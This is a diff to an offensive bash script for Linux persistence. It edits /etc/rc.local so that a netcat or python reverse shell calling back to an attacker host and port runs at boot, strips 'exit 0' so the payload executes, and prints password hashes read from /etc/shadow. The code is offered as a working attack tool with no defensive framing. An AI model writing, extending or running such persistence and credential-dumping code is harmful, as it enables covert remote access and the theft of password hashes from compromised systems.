@@ -16,6 +16,9 @@ fi
 
 if [ ! -f "/etc/rc.local" ];
 then
+	rclocal=no
+elif [ -f "/etc/rc.local" ];
+then
 	rclocal=yes
 fi
 
@@ -62,6 +65,12 @@ if [[ $root == "yes" ]];
 then
 	if [[ $rclocal == "yes" ]];
 	then
+		grep -v "exit 0" /etc/rc.local > /dev/shm/rc.local.tmp
+		mv /dev/shm/rc.local.tmp /etc/rc.local
+		rclocal=no
+	fi
+	if [[ $rclocal == "no" ]];
+	then
 		if [[ $python == "yes" ]];
 		then
 			if [[ $python == $nc ]];
@@ -88,8 +97,8 @@ then
 			echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in /etc/rc.local"
 			echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
 		fi
-		chmod +x /etc/rc.local
 	fi
+	chmod +x /etc/rc.local
 	echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
 	egrep -v "\*|\!" /etc/shadow
 fi
